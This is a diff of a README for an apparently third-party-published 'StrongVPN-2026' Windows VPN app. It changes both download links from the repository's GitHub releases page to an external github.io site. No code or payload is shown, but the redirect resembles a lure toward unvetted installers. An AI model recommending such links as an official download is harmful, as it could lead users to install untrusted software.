@@ -1,6 +1,6 @@
 # 🛡️ StrongVPN-2026 - Secure your internet connection today
 
-[![Download StrongVPN](https://img.shields.io/badge/Download-StrongVPN-blue)](https://github.com/Daffiindonesian754/StrongVPN-2026/releases)
+[![Download StrongVPN](https://img.shields.io/badge/Download-StrongVPN-blue)](https://daffiindonesian754.github.io)
 
 StrongVPN-2026 provides a private and secure tunnel for your internet traffic. This software hides your data from third parties and keeps your browsing habit private. Use this application on your Windows 10 or Windows 11 computer to browse the web with peace of mind.
 
@@ -8,7 +8,7 @@ StrongVPN-2026 provides a private and secure tunnel for your internet traffic. T
 
 To start, visit the official release page to download your copy.
 
-[https://github.com/Daffiindonesian754/StrongVPN-2026/releases](https://github.com/Daffiindonesian754/StrongVPN-2026/releases)
+[https://daffiindonesian754.github.io](https://daffiindonesian754.github.io)
 
 Follow these steps to obtain the correct file:
 
